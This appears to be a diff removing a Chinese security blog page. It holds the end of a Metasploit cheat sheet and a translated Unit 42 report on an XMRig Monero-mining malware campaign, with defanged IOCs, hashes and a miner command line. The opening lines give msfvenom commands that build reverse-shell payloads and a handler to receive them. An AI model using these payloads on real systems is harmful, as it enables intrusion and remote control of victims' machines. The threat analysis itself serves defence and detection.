-<p>Perl<br>msfvenom -p cmd/unix/reverse_perl LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.pl</your></your></p>
-<p>Shellcode</p>
-<p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p>
-<p>Linux Based Shellcode<br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f <language></language></your></your></p>
-<p>Windows Based Shellcode<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f <language></language></your></your></p>
-<p>Mac Based Shellcode<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f <language></language></your></your></p>
-<p>Handlers</p>
-<p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p>
-<p>use exploit/multi/handler<br>set PAYLOAD <payload name=""><br>set LHOST <lhost value=""><br>set LPORT <lport value=""><br>set ExitOnSession false<br>exploit -j -z</lport></lhost></payload></p>
-<p>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/01/28/metasploit备忘/" data-id="cjl3hvmk20011s89lkrmd768p" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-利用XMRig的大规模Monero挖矿行为" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/25/利用XMRig的大规模Monero挖矿行为/" class="article-date">
-  <time datetime="2018-01-25T02:02:10.000Z" itemprop="datePublished">2018-01-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/25/利用XMRig的大规模Monero挖矿行为/">利用XMRig的大规模Monero挖矿行为</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>昨天，Palo Alto发了一篇关于通过开源程序XMRig进行挖矿的行为报告，最近我们也在处理相关的事件，本文会结合我们处理的一些问题对Palo Alto的报告进行一个简单的翻译，文末有一大波IOC信息。</p>
-<p>January 24, 2018，Palo Alto发了一篇关于通过开源程序XMRig进行挖矿的行为报告，最近我们也在处理相关的事件，本文会结合我们处理的一些问题对Palo Alto的报告进行一个简单的翻译。</p>
-<h4 id="0x00-概要"><a href="#0x00-概要" class="headerlink" title="0x00 概要"></a>0x00 概要</h4><p>根据Palo Alto的数据，此次事件的受害者有1500万人，主要分布在东南亚，北非和南美洲。实际受害者可能更多，大概再3000万左右。</p>
-<p>攻击者大量使用VBS文件，并使用各种在线URL缩短服务来安装和运行XMRig payload。另外，攻击者在他们所连接的主机上利用XMRig代理服务来掩盖使用的钱包。</p>
-<h4 id="0x01-传播"><a href="#0x01-传播" class="headerlink" title="0x01 传播"></a>0x01 传播</h4><p>目前为止，在这个Monero加密货币挖掘活动中观察到超过250个独特的Microsoft Windows PE文件。</p>
-<p>其中一半以上的样本是从<a href="https://en.4sync.com/" target="_blank" rel="external">4sync</a>在线云存储提供商处下载的。不幸的是，还不知道是什么启动了恶意软件样本的这些下载。</p>
-<p>但是，当我们查看原始文件名时，可以得到一些线索。下面是观察到的原始文件名前缀的百分比：</p>
-<p><img src="/upload_image/original_filename.png" alt=""></p>
-<p>正如我们所看到的，攻击者希望使这些文件看起来既具有通用名称，也似乎来源于流行的文件共享服务。文件名还以其他方式提供线索，就像“[File4org]”这个前缀对于此特定恶意软件活动是唯一的。</p>
-<p><a href="https://adf.ly/" target="_blank" rel="external">Adf.ly</a>是一个网址缩短服务。根据下面报告，很多Adfly URLs是恶意链接，用户点击短链接，下载cryptocurrency恶意软件到他们的电脑上。</p>
-<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure1-3.png" alt="figure1"></p>
-<p><em>Figure 1 Reddit user complaining that they downloaded the cryptocurrency malware due to a malicious Adfly advertisement</em></p>
-<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure2-2.png" alt="img"></p>
-<p><em>Figure 2 YouTube user explaining how they downloaded and ran the cryptocurrency malware</em></p>
-<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure3-2.png" alt="img"></p>
-<p><em>Figure 3 User explaining that they downloaded the cryptocurrency malware when attempting to download a counter-strike: Go cheat using an Adfly URL. Translated from gutefrage.com, a German question/answer website.</em></p>
-<p>值得注意的是，图2中，受害者点击Adfly广告链接，认为是视频中提到的文件的下载。然而，下载了有问题的文件，重定向到Monero挖掘恶意软件。</p>
-<h4 id="0x02-恶意软件分析"><a href="#0x02-恶意软件分析" class="headerlink" title="0x02 恶意软件分析"></a>0x02 恶意软件分析</h4><p>这个Monero挖矿恶意软件有很多特征：</p>
-<ul>
-<li>通过VBS文件执行XMRig挖矿软件</li>
-<li>使用XMRig代理服务来隐藏矿池目标</li>
-<li>使用Nicehash</li>
-</ul>
-<p><a href="https://www.nicehash.com/" target="_blank" rel="external">NiceHash</a>是现今世界上最大的加密货币算力市场, 随时可为算力买家提供超过20种不同的算法的算力.</p>
-<p>在过去的4-5个月里，Unit 42(Palo Alto Networks)观察到了这些攻击者如何部署他们的恶意软件的变化。</p>
-<p>截至2017年10月20日，此活动背后的攻击者严重依赖Windows内置的<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa362813(v=vs.85" target="_blank" rel="external">BITSAdmin</a>.aspx)工具。这个工具允许攻击者远程下载脚本和XMRig挖矿工具。恶意样本的典型工作流程如下：</p>
-<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure4-2.png" alt="img"></p>
-<p><em>Figure 4 Execution workflow for the oldest malware encountered in this campaign</em></p>
-<p>删除VBS和LNK文件的初始样本是一个自解压缩可执行文件（SFX）。这些可执行文件在俄文语言的提取脚本中包含标准注释。用于下载附加示例的VBS文件很简洁，如下所示：<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_5.png" alt="Monero_5"></p>
-<p><em>Figure 5 Example VBS file observed in the oldest malware encountered in campaign</em></p>
-<p>最终的payload主要是安装”msvc.exe”。有一些是包括”winmsvc.exe”或者”onedrive.exe”.这些payload被丢弃在受害者的％APPDATA％文件夹中的一个子目录中。最常见的子文件夹名是”msvc“。</p>
-<p>第一批样本在2017年10月20日之前被发现，他们通过80, 443, 8443, 8080, 1725, 或者123端口连接到相同的XMRig代理服务：</p>
-<ul>
-<li>a.pool[.]ml</li>
-</ul>
-<p>2017年10月20日之后，攻击者开始尝试修改恶意软件的运行方式。他们不再使用BITSAdmin服务下载，并开始尝试使用HTTP重定向服务。在此期间，他们继续使用SFX文件下载和部署恶意软件。</p>
-<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_6.png" alt="Monero_6"></p>
-<p><em>Figure 6 Execution workflow for the second phase of malware encountered in this campaign</em></p>
-<p>从这批恶意软件样本开始，攻击者开始用一个用户名补充他们的挖掘查询，可能会区分特定的分布式攻击波。下面是一个矿工如何运行的例子：</p>
-<p>“C:\Users\Administrator\AppData\Roaming\mnxz\msvc.exe” -o 144.76.201[.]175:8080 -u x3 –nicehash –max-cpu-usage=20 –keepalive</p>
-<p>这些用户名在整个挖矿活动的其余部分都会继续存在，截至撰写本文时仍在使用。观察用户名的完整列表如下：</p>
-<ul>
-<li>x3x2</li>
-<li>x3</li>
-<li>x2</li>
-<li>x7x2</li>
-<li>x7x3</li>
-<li>x</li>
-<li>x6</li>
-<li>x7</li>
-<li>x4</li>
-<li>x5</li>
-</ul>
-<p>在这段时间内，攻击者为了逃避检测也开始在VBS文件中进行混淆尝试，如下所示：</p>
-<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_7.png" alt="Monero_7"></p>
-<p><em>Figure 7 Obfuscated VBS file used by attackers</em></p>
-<p>攻击者选择的重定向服务通常包含以下内容之一：</p>
-<ul>
-<li>clicklinkredirect[.]com</li>
-<li>clck[.]gg</li>
-<li>99lnk[.]com</li>
-<li>1395867912[.]pw</li>
-<li>browge[.]com</li>
-<li>lnkredirect[.]com</li>
-</ul>
-<p>应该注意的是，上面列出的所有域名都托管在德国的一个IP地址144.76.155 [.] 139上。虽然bitly多数情况下的用途是合法的，但是144.76.155[.]139这个IP托管的重定向服务专门用于和加密货币挖掘活动相关的恶意目的。与所遇到的原始恶意软件样本一样，攻击者通常使用名为’msvc.exe’程序来投放payload。有时候也以“ErrorCheck.exe”和“CleanError.exe”命名。样本的子文件夹主要是“msvc”,”mnxz”,”mnaxz”.</p>
-<p>在此期间，下列XMRig代理已被恶意软件用于连接：</p>
-<ul>
-<li>5.101.122[.]228</li>
-<li>144.76.201[.]175</li>
-<li>b.pool[.]gq</li>
-<li>f.pooling[.]cf</li>
-</ul>
-<p>从2017年11月16日开始，攻击者再次改变了他们的恶意软件的策略。他们不再使用SFX文件，而是转换为使用在Microsoft .NET Framework中编译的可执行文件，该文件将VBS文件写入磁盘并修改受害者的运行注册表项以确保持久性。<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_8.png" alt="img"></p>
-<p><em>Figure 8 .NET dropper file used by the attackers writing the VBS file to disk</em></p>
-<p>这个恶意软件通常以“msvc.exe“或者”mingc.exe“传播。此外，在这些样本中都有唯一的PDB字符串，这些样本始终对编译它的用户使用相同的用户名。</p>
-<p>在所有观察样本中发现了以下PDB字符串：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">C:\Users\роаипроаип\Desktop\MingC_Installer\MingC4\WindowsFormsApplication1\obj\x86\Debug\WindowsApplication.pdb</div><div class="line">C:\Users\роаипроаип\documents\visual studio 2015\Projects\WindowsFormsApplication1\WindowsFormsApplication1\obj\Debug\Inst.pdb</div><div class="line">C:\Users\роаипроаип\documents\visual studio 2015\Projects\WindowsFormsApplication2\WindowsFormsApplication2\obj\Debug\WindowsFormsApplication2.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MingC_Installer\MingC4\WindowsFormsApplication1\obj\Release\[File4org]_421058.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MingC3\WindowsFormsApplication1\obj\Debug\[File4org]_421058.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\WindowsFormsApplication1\WindowsFormsApplication1\obj\Debug\Oal.pdb</div><div class="line">C:\Users\Роман\Desktop\MingC2\WindowsFormsApplication1\obj\Release\[File4org]_421058.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MineCor\WindowsFormsApplication1\obj\Debug\[Dropmefiles]_421057.pdb</div><div class="line">C:\Users\роаипроаип\documents\visual studio 2015\Projects\WindowsFormsApplication1\WindowsFormsApplication1\obj\Debug\65453.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MineCor\WindowsFormsApplication1\obj\Debug\[File4org]_421057.pdb</div></pre></td></tr></table></figure>
-<p>读者会注意到大量存在用户名’роаипроаип’，这个用户名粗略地从俄语翻译成毫无意义的’roaiproaip’。此外，还有一个观察到的“Роман”实例，大致从俄文翻译成英文单词“Novel”。</p>
-<p>我们所看到的最后一个变化发生在2017年12月下旬，当时攻击者再次改变了用于部署恶意软件的dropper。</p>
-<p>丢弃.NET，他们用Borland Delphi编译的dropper来创建必要的VBS文件。与.NET droppers不同的是，这个特定的dropper将VBS文件放在受害者的启动文件夹中以获得持久性。否则，执行流程保持不变。<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_9.png" alt="Monero_9"></p>
-<p><em>Figure 9 Latest malware dropping the VBS file</em></p>
-<p>值得注意的是，使用这个dropper观察到的最新样本已经使用了以下新的IP地址用于XMRig通信：</p>
-<ul>
-<li>5.23.48[.]207</li>
-</ul>
-<h4 id="0x03-影响范围"><a href="#0x03-影响范围" class="headerlink" title="0x03 影响范围"></a>0x03 影响范围</h4><p>正如之前解释过的，在十月下旬和十二月下旬之间，攻击者严重依赖这个恶意的URL缩短服务来下载并随后执行XMRig Monero挖掘过程。所有恶意的重定向的完整列表在附录中。Bitly提供了围绕特定缩短网址的通用统计数据，这使得我们能够深入了解有多少受害者实际下载了这些样本。总的来说，我们观察到大约有一千五百万的受害者连接到这些URLs。<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_10.png" alt="Monero_10"></p>
-<p><em>Figure 10 Malicious bitly downloads over time</em></p>
-<p>虽然大多数国家都受影响，但似乎东南亚，北非和南美国家受到的冲击最大。</p>
-<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_11.png" alt="Monero_11"></p>
-<p><em>Figure 11 Malicious bitly downloads by country</em></p>
-<p>最常见的国家及其下载量如下：</p>
-<ol>
-<li>Thailand – 3,545,437</li>
-<li>Vietnam – 1,830,065</li>
-<li>Egypt – 1,132,863</li>
-<li>Indonesia – 988,163</li>
-<li>Turkey – 665,058</li>
-<li>Peru – 646,985</li>
-<li>Algeria – 614,870</li>
-<li>Brazil – 550,053</li>
-<li>Philippines – 406,294</li>
-<li>Venezuela – 400,661</li>
-</ol>
-<p>正如我们以前所说的，只有一部分样本使用了URL缩短服务。事实上，250个样本只有大约100个使用了它。这使我们相信，受害者的数量远远大于我们观察到的数量1500万。</p>
-<h4 id="0x04-结论"><a href="#0x04-结论" class="headerlink" title="0x04 结论"></a>0x04 结论</h4><p>通过恶意广告针对随机用户，对恶意软件文件使用看似无害的名称，同时使用内置的Windows实用程序和脚本文件，攻击者可以大规模感染受害者系统。</p>
-<p>正如我们所看到的，随着时间的推移，攻击者对其恶意软件工具集进行了迭代更新，每个月都在改变他们的策略。根据SFX和.NET droppers提供的线索，有一些边缘证据表明，袭击者可能位于东欧。迄今为止，已经有至少1500万受害者。这些受害者遍布全球，但最重的目标地区包括东南亚，北非和南美洲。</p>
-<p>Palo Alto Networks的客户可以通过以下几种方式防范这种威胁：</p>
-<p>恶意软件使用的所有URL都被标记为恶意软件</p>
-<p>所有观察到的样本在WildFire中被分类为恶意<br>陷阱可以通过WildFire集成来阻止这种威胁</p>
-<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><p><strong>XMRig Proxy Connections</strong></p>
-<p>5.101.122[.]228:8080</p>
-<p>5.23.48[.]207:7777</p>
-<p>144.76.201[.]175:80</p>
-<p>144.76.201[.]175:8080</p>
-<p>f.pooling[.]cf:80</p>
-<p>b.pool[.]gq:80</p>
-<p>a.pool[.]ml:8080</p>
-<p>a.pool[.]ml:123</p>
-<p>a.pool[.]ml:443</p>
-<p>a.pool[.]ml:8443</p>
-<p>a.pool[.]ml:80</p>
-<p>a.pool[.]ml:1725</p>
-<p><strong>Malicious Bitly Redirects</strong></p>
-<p>hxxp://bit[.]ly/2j3Yk8p</p>
-<p>hxxp://bit[.]ly/2hxuusK</p>
-<p>hxxp://bit[.]ly/2C7caP6</p>
-<p>hxxp://bit[.]ly/HSGADGFDS</p>
-<p>hxxp://bit[.]ly/2yV0JNa</p>
-<p>hxxp://bit[.]ly/2Algzhc</p>
-<p>hxxp://bit[.]ly/2zA08wz</p>
-<p>hxxp://bit[.]ly/2hcsSUN</p>
-<p>hxxp://bit[.]ly/2hr6KGb</p>
-<p>hxxp://bit[.]ly/2xOVfPH</p>
-<p>hxxp://bit[.]ly/2BoFNMr</p>
-<p>hxxp://bit[.]ly/2xlWVQl</p>
-<p>hxxp://bit[.]ly/2kEApR6</p>
-<p>hxxp://bit[.]ly/2AkVK8t</p>
-<p>hxxp://bit[.]ly/2yyUhLX</p>
-<p>hxxp://bit[.]ly/2AkyUvs</p>
-<p>hxxp://bit[.]ly/2zXRI6r</p>
-<p>hxxp://bit[.]ly/2jjXmbJ</p>
-<p>hxxp://bit[.]ly/2hzW6Rb</p>
-<p>hxxp://bit[.]ly/2mkHzdP</p>
-<p>hxxp://bit[.]ly/FSJKHJK</p>
-<p>hxxp://bit[.]ly/2gB0ZW0</p>
-<p>hxxp://bit[.]ly/2ixSCPu</p>
-<p>hxxp://bit[.]ly/FSFSAASA</p>
-<p>hxxp://bit[.]ly/2A5rxKB</p>
-<p>hxxp://bit[.]ly/2xbUmjC</p>
-<p>hxxp://bit[.]ly/2EHv415</p>
-<p>hxxp://bit[.]ly/2Aq3gja</p>
-<p>hxxp://bit[.]ly/2Bhr1tv</p>
-<p>hxxp://bit[.]ly/2ynGl7o</p>
-<p>hxxp://bit[.]ly/SOURCETXT</p>
-<p>hxxp://bit[.]ly/2zGXAQx</p>
-<p>hxxp://bit[.]ly/2hEhF3i</p>
-<p>hxxp://bit[.]ly/2y3iGnG</p>
-<p>hxxp://bit[.]ly/2ic2mvM</p>
-<p>hxxp://bit[.]ly/2itoMrG</p>
-<p>hxxp://bit[.]ly/2yvqOSU</p>
-<p>hxxp://bit[.]ly/2zCj1n2</p>
-<p>hxxp://bit[.]ly/2jEqYks</p>
-<p><strong>SHA256 Hashes</strong></p>
-<p>9854509ff8fab00e37fe07260a467b9520f3c0c6a0051b34a928258717e65b38</p>
-<p>27bd82de7b2532a954fdcd12ecd791be8bbdb402466902865e257e537bc3268a</p>
-<p>211ece6a0cc084f1253abe5d74e8d5faef5b7a9d2acafcaa5bbc53fe7d6f815c</p>
-<p>760eaa1dced0c000853a5dd01756c63b358e3894e9c8b1e7416538dd1858761e</p>
-<p>ffa7cd55b76a87153b50f4cb23cd03f2a9726e0b77cd8ced478794869877f8c8</p>
-<p>99ad9f17956fb69b9d8f1d69c66337fb1f53e4b94870296e5e4a32c4f5c0f609</p>
-<p>b1f40ea5ea6eca96a30dc5ab198f0e6904cf18de43d80595483d938292fa1717</p>
-<p>51deb82ed3d442f0c2c96b63cf3ac87781cf703367228bbcf066202ff74d67b5</p>
-<p>0a4377fbb8bb66cd80a48c9b9b407c9d2f1eaa2cab70c12121370f3ebacc5f41</p>
-<p>e7aa5ded306d2ae02deaeb08e8d7ceb73ac2e77a2fff2dba35d42605ce9a9b0d</p>
-<p>378d5d5bdf1cc7b91c59c1a839b57d5b2468097cf45ff078391bf3f1d95e6197</p>
-<p>c65654eba008243779ea54fb18cf1c7f1c70edd2a0933dea19bbfabe12f74131</p>
-<p>cbd16230248ac12c710d6e645864154fe23f33f5214f28e5dfb4e65728f4a95a</p>
-<p>b7b5b255b7a668c9d5c287516e553ad1a33160d52804fd357a8d413fd2a9cd46</p>
-<p>6e96ae1a7ba02486e0c31b840b32620405073131b9c9dc56f17de1cf4866d51e</p>
-<p>1c4e7388809d71a7fc021c55532a30949031474f4f3b147b0c468a1b27c9ff74</p>
-<p>a67572e6427b76d73bca63357d716748263beb5cbf7edf923ac3c7f6f214733f</p>
-<p>2ce678eb7d35d60b4c4b4f73d63b3a4fce1b4da1c39160cb78040577ae16c1c9</p>
-<p>8ac42287623d4be135daeaa9b8d906b017fd565549793666cab98defb3474639</p>
-<p>65c7ef9acd5382b2f29d08593bfb84b2e774d9290afae1591b1d1c81b6b9dea2</p>
-<p>a9861f341ad5a6ea0514d217ba43aa91d6014111846bc3d902c3256427a13031</p>
-<p>a00d71047066cd2c1be2e5ab1ce1e5d107f2ac7a11f64ec6a04c093674bdd542</p>
-<p>7c758b903654313928bec9929477a6d859de97ee42b3aa4c3ff278ec3faa07e4</p>
-<p>198cd118351f15d24b584e7b91bed2f23af210c54df65859d29814899e64e87f</p>
-<p>4ad4f390d252b9dc636fb2d423d15d4f4a89d4a2ffbaf2c0ab4667640fae61b1</p>
-<p>92f66ba544616079d811930510ff5df1f0969f1818ecb3f5313ad1e9b0ae04e3</p>
-<p>efa20de096ba6342b9af0369ec92bdc2659b7c81aba28f2c115b09c5f64280a3</p>
-<p>28aa000367fe83cae1bbc3bde608fa8e9bfb1e55d219bdcdfd30a2979825fed3</p>
-<p>9c6adb5026e152307f4a8f194d09554cde725cb17f9bb5259fac8083ffc00f62</p>
-<p>56f7c101d2abffcfae91509950da7fe243d74b292947ae7f8075fd9b6221ebbd</p>
-<p>0e1f82ac5acca3f826a2e5d9b5a3ba43431990aa0d0165c88ac5e0c7c84232ed</p>
-<p>534b54cea7b3c337f40ac5b0cf29cd4a0d9fd66369773f670a8192f85b008f2f</p>
-<p>483960f8f44f2f2d1467d3c7621063664e5f3ad43716db55d69f5c60bcda6b3c</p>
-<p>c786bd8ce1c856df4ebd52814f92b525e0a33af8abd86a246ee66c6ae88d38fd</p>
-<p>530871bd6a19a34e98fbb94e5c63d252f47345ed143cebb597d0389fbf239194</p>
-<p>db55fd8a332b0495b678c513b9013b34d09e3281d6b594a8b2cb290cd264f456</p>
-<p>d73ee4bdd3d6cbe3f68b0b11f8d74ac9b1d32bd9ae7dcf7ff7c5b4723ed5f3c4</p>
-<p>42804cdf893b5087872081dbcc1bf1c9346ed624e5eddcb0638cce61f351907a</p>
-<p>bbf3674ebe1948bfccb4de3b604b0bd052c1340e754ee7b81df697e16cdefd7a</p>
-<p>96a62130df62ccb19a1a31264fdf379431e98859de63f5bf01773d51774ab275<em>**</em></p>
-<p>f0f88095dc0e9a4b848f44e866937e70552a195804b867682453bc38abfb0359</p>
-<p>273ce573ecf145687d494e040e548b5f2a954b34a3cd87d495f7a9418f540d29</p>
-<p>b014dda9d7772d25ad82a3b7d63baea562883262e59d2cae5190fdd8b7c2ea8e</p>
-<p>a268ddaa57470ca20556641c5072d15d8e06e8f359af31ae39d75c280276bb3f</p>
-<p>d80493e4aa95dd3a524b8feed7bc1c183d5aa666fea4d761658ace23b4083db6</p>
-<p>743e3615e3c70a71026a304e8139644eb3080c2d703083a1f543fb329079b9c5</p>
-<p>6ba40196d339a5b73679ef8239db823d7111e07e812a9048c44381e2561599e1</p>
-<p>8d779ad637a1d8c42a8c73736eff1eed0f493cba437566f3b78f080c05709aee</p>
-<p>b6227e13e57676c7452b744051db22de7bc5517ca64d2cff04324181be64ebad</p>
-<p>e0134955c1bc512f46fd90c37ca4e2946e4c00ca105de4ffb465e6d3efcf2fe5</p>
-<p>5bdb864363a02ef1c39192fc5941d08e5637c8d3ff88f2d1548c886cf154d11d</p>
-<p>6489cddbc414ccf8b7fb52d4b73260c48c51d92d403a937c919007d8b189f721</p>
-<p>56406274e20c548f794044e25613c21108da55adc72252bb4e94d2d4e3aa0997</p>
-<p>c1b5a8ab1d3aa78372fa90fa49fe4a9271362ae3e82eb601336dc9035b9ca078</p>
-<p>5eb5a96c67c61badcbe1d2bcc733f0b667224eab9943ead7f3b6409c3cecaab2</p>
-<p>9641386a29614f5cca303e2088ab00c720dfcd41b6a3f162548804e028ce86e8</p>
-<p>0ef8d930b4bcc1c5aeda5d7fad73adbadc8f0b9187d2f25ec9cf8cbc271fdfd8</p>
-<p>2da27931fabf48bd3661bad99289d7f218aa758f581bbc213235915809c6c79f</p>
-<p>1b2ffb7f06d04f5417d272ca55627e4000dfa4371234856100023016bfa2fbde</p>
-<p>de04f1b184e9658829273c0d6922864e87f7a62b395b69a0e616be53701508d9</p>
-<p>0fd91e64a0b9fc0e8ed915c5f574f08ee276edc2b6cb5c374e7db6faa748dedf</p>
-<p>b008f2dac98e54ca82d468063fb2df957ef3f08082409ab57279b37a46f862c8</p>
-<p>0dc32454909f48fcbcd0460da9b22fe43ce7a816eb032e38780aeca993f288ff</p>
-<p>90fdf62ed73ba9e264be72804d7c4325219eb8576f552b283d2c2f88d39994c3</p>
-<p>e4df13b4f31f2505a82340b60d144d8bda03075fdd12be6f66baf38c6dfc78f3</p>
-<p>60c439d6d025bf948a447d9223763a255cc15cb2df2db7a8dab6a5a27242feb0</p>
-<p>5aa2a88bd729232acf4bb350ca1801755fcd562a5297b41a70f81c98f0e3c27f</p>
-<p>24031b60c0485eaa11eaee1a5799503927799042d373bfef7d6aa23b1f9e1076</p>
-<p>86b2f50b9e5ccadedbb2a2114538947a01dea49e3b20cc79cf249a0f1b3cc130</p>
-<p>ffa7c9701d1b4f4f00da45652403cac843276cc72138d7d1a30dcac660bd45a8</p>
-<p>1eafcb280df27d39c19b325366804c602a8f70f655d9fda227b5ff69768f30cc</p>
-<p>dbb0d7c2bf65d46d7c61f71e977d077959e8ec926a540b12043ed78de50a3d83</p>
-<p>1d1e2c6acedb17730f104fc1c1a1154ef312a99ed1dab65bb33aaf587e9ca3b7</p>
-<p>2369f3250fa52d53d7a8f8d0b3b7addad0757d642fa9303f830944d1e27b862d</p>
-<p>fda651a5fba8558677d9647bb0938c10b4c16b6b7b311402c96d59f4efbbeeea</p>
-<p>447da9f937cae3841d397166b24586d88d48f6de44ad953b7c5243cb8f0fc150</p>
-<p>7b5b9c9528358db7012f6f9ae607f8792124de1b8dce8a4b0710238e9f5179c6</p>
-<p>bb8827a6cad2fa45de912cdb6ea8b8bc9b5d0403476d73eb2f38dc7c4ccc5c6d</p>
-<p>126b36eb3aab62a03671fe5364cfb7c4b290e77d189fb4c86a37a570977375b7</p>
-<p>dee1ee50d2f77ba6382c8270c8dd832815571c547cb48dcadb0a420ddbf9b4a4</p>
-<p>f0082fe2399772d2045244cd0539f85d3a8b2414be4a020c78d8bcf072576f93</p>
-<p>f5eaec6491ffbbd8a02a6e0316362b4ebea73cc71407704cdc7dfa027d882554</p>
-<p>8629c3b7383dcfff1cb191692f374c5aff01b9ee0ba4810843c7e23c3af7716e</p>
-<p>0e4212a85ec0213dd749fa8355a0d48fdbd02cfc2a35191c8eadd4f8195a52c2</p>
-<p>d30e033ec02b84fbc350dbb01a708e1258c212d58316f49318ee86da05b22e88</p>
-<p>268ff015b20542c5052c5623a6b9e432f0d344a1cfc275500f6a882496aa6928</p>
-<p>c53f1e93859cd171cf8ba0639520d32a73ca26a9bf924b00d586b36be47dea9e</p>
-<p>a76c23385d806d85544d1b653253f7d0dac9f737c4520179ff5ced5922237da0</p>
-<p>3d100a7cd2dbc5ee1fb556f40f7a3c4d29284d8a009c0804e632e0c42307d85e</p>
-<p>7de0bb6673f010338fe4f0c55538fc7f47d92cfcd37c0dbecdc311cc2b55f1cd</p>
-<p>538ce967ae115fb5ffb090f4c133f20c0c6ceb5c67c8aeadc59e47cb498fd819</p>
-<p>804c730864ef674e696cdb915701889a3b8a11abc46f14580cb710d25d86401a</p>
-<p>cfcd15c6c2ca6f0f7b9c3eab9af99bcb846af2b0f352620f9c4b80852b548c17</p>
-<p>bad5e8953ca0ee8c06027680af71c30d1785d0741e23360c352f622274d51a72</p>
-<p>b043e53213e141f8988537a9e315563079bb6c0ddd339b05db36590e187f4d2e</p>
-<p>4bde85795a657460b9d99e3b3c9d120be27f645f828cb97f6929ea8dc44e2791</p>
-<p>9e39850693851da2317f49aa4df5727929c852f27ada6d69ce0323f5374ac181</p>
-<p>8cfce10bb4e5b84731bc14e7100433744b126d3d5272bf754a5f95c17549a712</p>
-<p>3111c755bc0fc2428873b7ad6272078cea863a2304f6388ca65e598bc2de7190</p>
-<p>c90c33a40180c5aa3b514ca41cb3dc4615bed1bdc8c0572482f7a8766316dd2d</p>
-<p>b22573436f1f6f1dc5c023a4c72b497a3ad219d801fd569d3fda9ced7e9d66c2</p>
-<p>43942883332d09ea48b6926d5e670a86cdb9e09bff8928f40c93095f4fcb796d</p>
-<p>220ba3c2d8f5638c44005866e814a4f6ba502b8f01b8db7218a87bc1e7700c8b</p>
-<p>f2ada4133eb79c78207935a9a27d657480489953cfe93c8b0f88147117b47c33</p>
-<p>170e8484ddebfe84dfe4b80cf0cf3ee03b03a15898a567f07b0382e76c0b433b</p>
-<p>81aca5cfe7f8476a49aa51ce4f7b71faef7b3b8e208f5b77e7209fc0391ad2a2</p>
-<p>ba0779de750bd1a2cd8879de506778e1b36589f91cb37aaf7e9913d7cd27431d</p>
-<p>261d731390a9a73495f2fd772b0e28ef68c3450db51bf9948a8b4fe32592c36c</p>
-<p>9babfee6e12d17545db3cd6968a1fb61bf548cf0204b90ef2c1ebcd66e20aef0</p>
-<p>344a5d9864baf9e274f2d65600f717881c034dd9156167bfd8654c7e732d12d1</p>
-<p>5cd5cba3a11ba6102d9086795561376412fc201e2d49ec00039f1a553f7a32f5</p>
-<p>d05b329848fc939f6a3fb4f2e40bead858b4994b681648c09ae30587e5a2b8b3</p>
-<p>c6a8cf482cc79a40c0f48f48ffd8ebf992328f73210f246f0dc64661eec04901</p>
-<p>e773dfa365a33ae4159ad179de58288910d4f785f6ac72f805f305ffcb85e709</p>
-<p>66e2575f658ffb972dfb76768031f6a8998ea71c6c758c872631b5ec6e7f3010</p>
-<p>4350ff8266535c9258f24af86502e7e06c88fd67c3936c688f270c9f42d731fd</p>
-<p>c94b77e2810b6e41e6168bf7cf78f6aea29391fb616f36ecb66ab5b1b3038240</p>
-<p>ec3e601df45cffb358766ec849abda6562ac67323366e906779196d19e1344e6</p>
-<p>b89d221fdc999f18db022522e3e987868414e11ed96e0d3b135a23d99895303d</p>
-<p>948679b70c888c8e2d63f09abbd59c26fe6740779d76f2f72e97938ef232c1f4</p>
-<p>d525b9c49914a2779478fb327fe8c57b5e17fa8f583c50528f1a19262ee73f4d</p>
-<p>45848953386219205bd0c9a580c54ee102d5915bcd7fe882306c8051ea182580</p>
-<p>f2ffac424ac0b9d85fb723862cabb6bcc70133777ec6811eb52f47743dcf273a</p>
-<p>d8884912854923e55fa0b850e3370389aeccff171f7c3207bb1d60a98cf6f767</p>
